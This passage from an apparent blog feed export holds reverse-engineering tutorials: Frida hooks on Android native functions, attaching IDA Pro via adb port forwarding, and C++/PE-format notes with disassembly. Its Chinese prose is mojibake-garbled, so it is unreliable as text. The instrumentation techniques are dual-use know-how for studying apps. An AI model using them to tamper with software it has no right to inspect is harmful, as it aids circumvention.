<p>å¡æ­»çš„å‡ ç‡æ¯”è¾ƒé«˜</p>
</blockquote>
<ol>
<li>è·å¾—æŒ‡ä»¤çš„åœ°å€</li>
<li>æ‰“å°ä¸Šä¸‹æ–‡ context</li>
</ol>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Interceptor</span>.<span class="title function_">attach</span>(addr, &#123;</span><br><span class="line">  <span class="attr">onEnter</span>: <span class="keyword">function</span> (<span class="params">args</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;start function&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">context</span>))</span><br><span class="line">    <span class="comment">// å…·ä½“çš„å¯„å­˜å™¨å€¼</span></span><br><span class="line">    conslole.<span class="title function_">log</span>(<span class="variable language_">this</span>.<span class="property">context</span>.<span class="property">x0</span>)</span><br><span class="line">  &#125;,</span><br><span class="line"></span><br><span class="line">  <span class="attr">onLeave</span>: <span class="keyword">function</span> (<span class="params"></span>) &#123;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h2 id="IDA-Attach"><a href="#IDA-Attach" class="headerlink" title="IDA Attach"></a>IDA Attach</h2><blockquote>
<p>IDA yyds</p>
</blockquote>
<ol>
<li>æ‰‹æœºå¯åŠ¨ IDA Pro <code>dbgsrv</code> ä¸­çš„ android_server(x86_64 æˆ–è€… arm æ ¹æ®æœºå‹é€‰æ‹©)</li>
<li>ç«¯å£è½¬å‘</li>
<li>IDA Pro é¡¶æ  Debugger -&gt; Attach -&gt; Remote Android debugger</li>
</ol>
<p>éœ€è¦ç«¯å£è½¬å‘æ‰èƒ½attachï¼Œå°†androidç«¯å£è½¬å‘ä¸€ä¸‹</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">adb forward tcp:23946 tcp:23946</span><br></pre></td></tr></table></figure>


<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://developer.android.com/reference/android/os/Bundle">Bundle Android Developers</a></li>
<li><a href="https://frida.re/docs/home/">Frida â€¢ A world-class dynamic instrumentation toolkit</a></li>
<li><a href="https://zhuanlan.zhihu.com/p/520523247?accessToken=eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQiLCJ0eXAiOiJKV1QifQ.eyJleHAiOjE2OTg3NDkwNTMsImZpbGVHVUlEIjoiZ1hxbWRWdmJPRXNYcG8zbyIsImlhdCI6MTY5ODc0ODc1MywiaXNzIjoidXBsb2FkZXJfYWNjZXNzX3Jlc291cmNlIiwidXNlcklkIjotODM1Mjk0Njk4M30.3D24gUz7Zah8RqqqLRzUIr5z1PlHm7nDF22mMsj6zBw">JNIåŠ¨æ€æ³¨å†Œã€é™æ€æ³¨å†Œå®ä¾‹åŠå…¶å®ç°åŸç†åˆ†æ</a></li>
</ul>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>C++é€†å‘</title>
    <url>/2024/01/19/C++%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<blockquote>
<p>ä»€ä¹ˆï¼Ÿå¯¹è±¡ï¼Œè™šï¼Ÿ</p>
</blockquote>
<span id="more"></span>

<h2 id="PE-æ–‡ä»¶æ ¼å¼"><a href="#PE-æ–‡ä»¶æ ¼å¼" class="headerlink" title="PE æ–‡ä»¶æ ¼å¼"></a>PE æ–‡ä»¶æ ¼å¼</h2><blockquote>
<p>ä¸ºä»€ä¹ˆä¼šæœ‰è¿™ä¸ªï¼Ÿé€†å‘ä¸ºä»€ä¹ˆæ²¡æœ‰è¿™ä¸ªï¼</p>
</blockquote>
<p>å¾®è½¯å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE æ ¼å¼ - Win32 apps</a></p>
<p>ä½¿ç”¨ 010editor æŸ¥çœ‹ã€‚éœ€è¦å…ˆä¸‹è½½æ’ä»¶ï¼šæ¨¡æ¿-&gt;æ¨¡æ¿åº“-&gt;å®‰è£… exe.bt ã€‚alt+4 å¯ä»¥æŸ¥çœ‹PEæ–‡ä»¶æ ¼å¼</p>
<h3 id="DOS-å¤´"><a href="#DOS-å¤´" class="headerlink" title="DOS å¤´"></a>DOS å¤´</h3><p>ä¸¤ä¸ªé‡è¦çš„å˜é‡ <code>e_magic</code>(åˆ¤æ–­æ˜¯å¦ä¸ºDOSå¤´ï¼Œå›ºå®šä¸º<code>5a4d</code>) å’Œ <code>e_lfanew</code>(NTå¤´çš„åç§») </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER</span><br></pre></td></tr></table></figure>

<h3 id="DOS-stub"><a href="#DOS-stub" class="headerlink" title="DOS stub"></a>DOS stub</h3><p>MS-DOS å­˜æ ¹æ˜¯åœ¨ <em>MS-DOS ä¸‹è¿è¡Œçš„æœ‰æ•ˆåº”ç”¨ç¨‹åº</em>ã€‚ å®ƒæ”¾ç½®åœ¨ EXE æ˜ åƒçš„å‰é¢ã€‚ é“¾æ¥å™¨åœ¨æ­¤å¤„æ”¾ç½®ä¸€ä¸ªé»˜è®¤å­˜æ ¹ï¼Œå½“æ˜ åƒåœ¨ MS-DOS ä¸­è¿è¡Œæ—¶ï¼Œè¯¥å­˜æ ¹è¾“å‡ºæ¶ˆæ¯â€œæ­¤ç¨‹åºæ— æ³•åœ¨ DOS æ¨¡å¼ä¸‹è¿è¡Œâ€ã€‚</p>
<h3 id="NT-å¤´"><a href="#NT-å¤´" class="headerlink" title="NT å¤´"></a>NT å¤´</h3><p><code>IMAGE_NT_HEADERS</code> ç»“æ„</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>

<h4 id="ç­¾å"><a href="#ç­¾å" class="headerlink" title="ç­¾å"></a>ç­¾å</h4><p>ç­¾åæ˜¯ä¸€ä¸ªå›ºå®šçš„å€¼</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_SIGNATURE                  0x00004550  <span class="comment">// PE00</span></span></span><br></pre></td></tr></table></figure>

<h4 id="FileHeader"><a href="#FileHeader" class="headerlink" title="FileHeader"></a>FileHeader</h4><p>æ–‡ä»¶å¤´åŒ…å«äº†å¾ˆå¤šé‡è¦çš„å±æ€§</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">	WORD    Machine;					<span class="comment">// å–å†³äºæœºå™¨ï¼ŒARM, x86...</span></span><br><span class="line">	WORD    NumberOfSections;			<span class="comment">// Section æ•°é‡</span></span><br><span class="line">	DWORD   TimeDateStamp;				<span class="comment">// æ–‡ä»¶åˆ›å»ºæ—¶é—´</span></span><br><span class="line">	DWORD   PointerToSymbolTable;		<span class="comment">// æŒ‡å‘ç¬¦å·è¡¨</span></span><br><span class="line">	DWORD   NumberOfSymbols;			<span class="comment">// ç¬¦å·è¡¨ä¸­ç¬¦å·ä¸ªæ•°</span></span><br><span class="line">	WORD    SizeOfOptionalHeader;		<span class="comment">// å¯é€‰å¤´çš„å¤§å°</span></span><br><span class="line">	WORD    Characteristics;			<span class="comment">// æ–‡ä»¶å±æ€§ï¼Œæ˜¯å¦ä¸ºDLLç­‰</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, * PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<h4 id="OptionalHeader"><a href="#OptionalHeader" class="headerlink" title="OptionalHeader"></a>OptionalHeader</h4><p>å¯é€‰å¤´</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;                      <span class="comment">// é­”æœ¯å­—</span></span><br><span class="line">    BYTE        MajorLinkerVersion;         <span class="comment">// linker ç‰ˆæœ¬å·</span></span><br><span class="line">    BYTE        MinorLinkerVersion;     </span><br><span class="line">    DWORD       SizeOfCode;                </span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;        <span class="comment">// ç¨‹åºæ‰§è¡Œå…¥å£RVA</span></span><br><span class="line">    DWORD       BaseOfCode;                 <span class="comment">// ä»£ç çš„èŠ‚çš„èµ·å§‹RVA</span></span><br><span class="line">    ULONGLONG   ImageBase;                  <span class="comment">// ä¼˜å…ˆè£…è½½åœ°å€</span></span><br><span class="line">    DWORD       SectionAlignment;           <span class="comment">// å†…å­˜ä¸­çš„èŠ‚çš„å¯¹é½</span></span><br><span class="line">    DWORD       FileAlignment;              <span class="comment">// æ–‡ä»¶ä¸­çš„èŠ‚çš„å¯¹é½</span></span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;         <span class="comment">// DLLæ–‡ä»¶ç‰¹æ€§</span></span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;                <span class="comment">// ä¸è°ƒè¯•æœ‰å…³</span></span><br><span class="line">    DWORD       NumberOfRvaAndSizes;        <span class="comment">// æ•°æ®ç›®å½•ç»“æ„çš„é¡¹ç›®æ•°é‡</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, * PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

<p>ImageBase: æ–‡ä»¶åœ¨å†…å­˜ä¸­çš„é¦–é€‰è£…å…¥åœ°å€ã€‚å¦‚æœæœ‰å¯èƒ½ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œç›®å‰å¦‚æœæ²¡æœ‰å…¶ä»–å æ®è¿™å—åœ°å€ï¼Œå®ƒæ˜¯æ­£ç¡®å¯¹é½çš„å¹¶ä¸”æ˜¯ä¸€ä¸ªåˆæ³•çš„åœ°å€ï¼Œç­‰ç­‰ï¼‰ï¼ŒåŠ è½½å™¨è¯•å›¾åœ¨è¿™ä¸ªåœ°å€è£…å…¥PEæ–‡ä»¶ã€‚å¦‚æœå¯æ‰§è¡Œæ–‡ä»¶æ˜¯åœ¨è¿™ä¸ªåœ°å€è£…å…¥çš„ï¼Œé‚£ä¹ˆåŠ è½½å™¨å°†è·³è¿‡åº”ç”¨<em>åŸºå€é‡å®šä½</em>çš„æ­¥éª¤ã€‚</p>
<h3 id="Section"><a href="#Section" class="headerlink" title="Section"></a>Section</h3><p>èŠ‚çš„åˆå§‹åŒ–æ•°æ®ç”±ç®€å•çš„å­—èŠ‚å—ç»„æˆã€‚ ä½†æ˜¯ï¼Œå¯¹äºå…¨éƒ¨ä¸ºé›¶çš„èŠ‚ï¼Œä¸éœ€è¦åŒ…å«èŠ‚æ•°æ®ã€‚</p>
<p>æ¯ä¸ªèŠ‚çš„æ•°æ®ä½äºèŠ‚å¤´ä¸­çš„ PointerToRawData å­—æ®µç»™å‡ºçš„æ–‡ä»¶åç§»é‡å¤„ã€‚ æ–‡ä»¶ä¸­æ­¤æ•°æ®çš„å¤§å°ç”± SizeOfRawData å­—æ®µæŒ‡ç¤ºã€‚ å¦‚æœ SizeOfRawData å°äº VirtualSizeï¼Œåˆ™å…¶ä½™éƒ¨åˆ†ç”¨é›¶å¡«å……ã€‚</p>
<p>è¿™é‡Œçš„å¯¹é½å’Œå¯é€‰å¤´çš„ <code>SectionAlignment</code>å’Œ <code>FileAlignment</code> ç›¸å…³</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">	BYTE    Name[IMAGE_SIZEOF_SHORT_NAME];          <span class="comment">// åç§° .text .bss ç­‰</span></span><br><span class="line">	<span class="keyword">union</span> &#123;</span><br><span class="line">		DWORD   PhysicalAddress;</span><br><span class="line">		DWORD   VirtualSize;</span><br><span class="line">	&#125; Misc;</span><br><span class="line">	DWORD   VirtualAddress;                         <span class="comment">// èŠ‚åŒºçš„ RVA åœ°å€</span></span><br><span class="line">	DWORD   SizeOfRawData;                          <span class="comment">// æ–‡ä»¶å¯¹é½åçš„å¤§å°</span></span><br><span class="line">	DWORD   PointerToRawData;                       <span class="comment">// FOA</span></span><br><span class="line">	DWORD   PointerToRelocations;</span><br><span class="line">	DWORD   PointerToLinenumbers;</span><br><span class="line">	WORD    NumberOfRelocations;</span><br><span class="line">	WORD    NumberOfLinenumbers;</span><br><span class="line">	DWORD   Characteristics;                        <span class="comment">// èŠ‚å±æ€§å¦‚å¯è¯»ï¼Œå¯å†™ï¼Œå¯æ‰§è¡Œç­‰</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, * PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure>

<h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>éå¸¸ç®€å•çš„æºç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b, <span class="type">int</span> c, <span class="type">int</span> d, <span class="type">int</span> e, <span class="type">int</span> f, <span class="type">int</span> g)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> a;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;hello world&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	a = <span class="number">10</span>;</span><br><span class="line">	std::cout &lt;&lt; <span class="built_in">func</span>(a, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>) &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å¸¦ç¬¦å·è¡¨çš„åæ±‡ç¼–ï¼Œå¯ä»¥çœ‹å‡ºå…¶æ¯”è¾ƒé•¿çš„ namespace å’Œ å‡½æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  std::ostream *v0; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// eax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">j___CheckForDebuggerJustMyCode</span>(&amp;_4C11826D_reverse_cpp);</span><br><span class="line">  v0 = std::<span class="keyword">operator</span>&lt;&lt;&lt;std::char_traits&lt;<span class="type">char</span>&gt;&gt;(std::cout, <span class="string">&quot;hello world&quot;</span>);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v0, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  v1 = <span class="built_in">func</span>(<span class="number">10</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>, <span class="number">6</span>, <span class="number">7</span>);</span><br><span class="line">  v2 = std::ostream::<span class="keyword">operator</span>&lt;&lt;(std::cout, v1);</span><br><span class="line">  std::ostream::<span class="keyword">operator</span>&lt;&lt;(v2, std::endl&lt;<span class="type">char</span>,std::char_traits&lt;<span class="type">char</span>&gt;&gt;);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="CALL-æ–¹å¼"><a href="#CALL-æ–¹å¼" class="headerlink" title="CALL æ–¹å¼"></a>CALL æ–¹å¼</h3><p>å…·ä½“å‚è€ƒï¼š<a href="https://learn.microsoft.com/zh-cn/cpp/cpp/argument-passing-and-naming-conventions?view=msvc-170">è‡ªå˜é‡ä¼ é€’å’Œå‘½åçº¦å®š | Microsoft Learn</a>****</p>
<p><strong><code>__cdecl</code></strong>Â æ˜¯ C å’Œ C++ ç¨‹åºçš„é»˜è®¤è°ƒç”¨çº¦å®šã€‚ å †æ ˆç”±<code>caller</code>æ¸…ç†,å‡½æ•°ä¼ é€’é¡ºåº ä»å³åˆ°å·¦</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> __cdecl <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>__stdcall</code></strong>Â è°ƒç”¨çº¦å®šç”¨äºè°ƒç”¨ Win32 API å‡½æ•°ã€‚<code>callee</code>æ¸…ç†å †æ ˆï¼Œå‡½æ•°ä¼ é€’æ–¹å¼ ä»å³åˆ°å·¦ã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> WINAPI __stdcall</span></span><br><span class="line"><span class="function"><span class="type">void</span> __stdcall <span class="title">method</span><span class="params">()</span></span>;</span><br></pre></td></tr></table></figure>

<p><strong><code>__fastcall</code></strong>Â è°ƒç”¨çº¦å®šæŒ‡å®šå°½å¯èƒ½åœ¨å¯„å­˜å™¨ä¸­ä¼ é€’å‡½æ•°çš„è‡ªå˜é‡ã€‚ æ­¤è°ƒç”¨çº¦å®šä»…é€‚ç”¨äº x86 ä½“ç³»ç»“æ„ã€‚å‚æ•°ä¼ é€’</p>
<ul>
<li>x86 ä»å·¦åˆ°å³çš„é¡ºåºæ‰¾åˆ°å‰ä¸¤ä¸ªÂ <code>DWORD</code>Â æˆ–æ›´å°è‡ªå˜é‡å°†åœ¨ ECX å’Œ EDX å¯„å­˜å™¨ä¸­ä¼ é€’ï¼›æ‰€æœ‰å…¶ä»–è‡ªå˜é‡åœ¨å †æ ˆä¸Šä»å³å‘å·¦ä¼ é€’ã€‚</li>
<li>x64 ä¸‹æ˜¯ rcx, rdx, r8, r9</li>
</ul>
<p><strong><code>__thiscall</code></strong> çš„è°ƒç”¨çº¦å®šç”¨äº x86 ä½“ç³»ç»“æ„ä¸Šçš„ C++ ç±»æˆå‘˜å‡½æ•°ï¼Œ<strong>ç‰¹å®šäº Microsoft</strong> </p>
<p>æ¯”å¦‚è¯´ call func çš„ æ±‡ç¼–ä»£ç ï¼Œæˆ‘åœ¨x64ä¸‹æ˜¯ fastcall</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000140011</span>CEE                 mov     [rbp+<span class="number">0F</span>0h+a], <span class="number">0</span>Ah</span><br><span class="line">.text:<span class="number">0000000140011</span>CF5                 mov     [rsp+<span class="number">130</span>h+g], <span class="number">7</span> ; g</span><br><span class="line">.text:<span class="number">0000000140011</span>CFD                 mov     [rsp+<span class="number">130</span>h+f], <span class="number">6</span> ; f</span><br><span class="line">.text:<span class="number">0000000140011</span>D05                 mov     [rsp+<span class="number">130</span>h+e], <span class="number">5</span> ; e</span><br><span class="line">.text:<span class="number">0000000140011</span>D0D                 mov     r9d, <span class="number">4</span>          ; d</span><br><span class="line">.text:<span class="number">0000000140011</span>D13                 mov     r8d, <span class="number">3</span>          ; c</span><br><span class="line">.text:<span class="number">0000000140011</span>D19                 mov     edx, <span class="number">2</span>          ; b</span><br><span class="line">.text:<span class="number">0000000140011</span>D1E                 mov     ecx, [rbp+<span class="number">0F</span>0h+a] ; a</span><br><span class="line">.text:<span class="number">0000000140011</span>D21                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯åœ¨ x86 å°±æ˜¯ cdecl call</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0041253</span>C                 push    <span class="number">7</span>               ; g</span><br><span class="line">.text:<span class="number">0041253</span>E                 push    <span class="number">6</span>               ; f</span><br><span class="line">.text:<span class="number">00412540</span>                 push    <span class="number">5</span>               ; e</span><br><span class="line">.text:<span class="number">00412542</span>                 push    <span class="number">4</span>               ; d</span><br><span class="line">.text:<span class="number">00412544</span>                 push    <span class="number">3</span>               ; c</span><br><span class="line">.text:<span class="number">00412546</span>                 push    <span class="number">2</span>               ; b</span><br><span class="line">.text:<span class="number">00412548</span>                 mov     eax, [ebp+a]</span><br><span class="line">.text:<span class="number">0041254B</span>                 push    eax             ; a</span><br><span class="line">.text:<span class="number">0041254</span>C                 call    j_?func@@YAHHHHHHHH@Z ; <span class="built_in">func</span>(<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>,<span class="type">int</span>)</span><br></pre></td></tr></table></figure>

<p>ä½†æ˜¯ä¸å˜çš„æ˜¯ <code>rax</code> ä¸ºå‡½æ•°è¿”å›å€¼</p>
<h2 id="Class"><a href="#Class" class="headerlink" title="Class"></a>Class</h2><p>æµ‹è¯•ä»£ç </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	<span class="type">int</span> _age;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Person</span>() &#123;</span><br><span class="line">		_age = <span class="number">0</span>;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Person</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~person&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>= <span class="number">0</span>;</span><br><span class="line">	<span class="function"><span class="keyword">virtual</span> <span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>= <span class="number">0</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Boy</span> : <span class="keyword">public</span> Person &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">Boy</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">virtual</span> ~<span class="built_in">Boy</span>() &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;~boy&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">int</span> <span class="title">GetAge</span><span class="params">()</span> </span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy getage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> <span class="number">114</span>;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function"><span class="type">void</span> <span class="title">SetAge</span><span class="params">(<span class="type">int</span> age)</span> </span>&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;boy setage&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	std::vector&lt;Boy&gt; boys;</span><br><span class="line">	Boy b;</span><br><span class="line">	boys.<span class="built_in">push_back</span>(b);</span><br><span class="line">	<span class="keyword">auto</span> f = [](<span class="type">int</span> a, <span class="type">int</span> b) -&gt; <span class="type">int</span> &#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;lambda&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="keyword">return</span> a + b;</span><br><span class="line">		&#125;;</span><br><span class="line">	std::cout &lt;&lt; <span class="built_in">f</span>(<span class="number">1</span>, <span class="number">2</span>) &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>C++ åç§°ç²‰ç¢æœºåˆ¶ï¼šä¸¾ä¸ªä¾‹å­ <code>std::cout</code> åå­—æ˜¯ <code>__imp_?cout@std@@3V?$basic_ostream@DU?$char_traits@D@std@@@1@A:qword</code>ã€‚</p>
<ul>
<li>æ›´å¥½çš„é‡è½½</li>
</ul>
<p><code>MSVC</code> åç¼–è¯‘å‡ºæ¥ï¼Œä¼˜åŒ–æ¯”è¾ƒä¸¥é‡ï¼Œå› æ­¤ä½¿ç”¨<code>g++</code></p>
<h3 id="æ–¹æ³•"><a href="#æ–¹æ³•" class="headerlink" title="æ–¹æ³•"></a>æ–¹æ³•</h3><p>ææ„å‡½æ•°å’Œæ„é€ å‡½æ•°</p>
<p>æ„é€ å‡½æ•°è°ƒç”¨ï¼šå‡½æ•°å£°æ˜æ—¶ï¼›ææ„å‡½æ•°ï¼šç”Ÿå‘½å‘¨æœŸç»“æŸæ—¶</p>
<p>åæ±‡ç¼–æ—¶ï¼Œæ–¹æ³•ç¬¬ä¸€ä¸ªå‚æ•°ä¸€èˆ¬æ˜¯ <code>this</code> æŒ‡é’ˆ</p>
<h3 id="ç»§æ‰¿"><a href="#ç»§æ‰¿" class="headerlink" title="ç»§æ‰¿"></a>ç»§æ‰¿</h3><p>åœ¨æ„é€ æ—¶ï¼Œæ„é€ é¡ºåºä¸ºå…ˆæ„é€ çˆ¶ç±»ï¼Œåæ„é€ å­ç±»ã€‚</p>
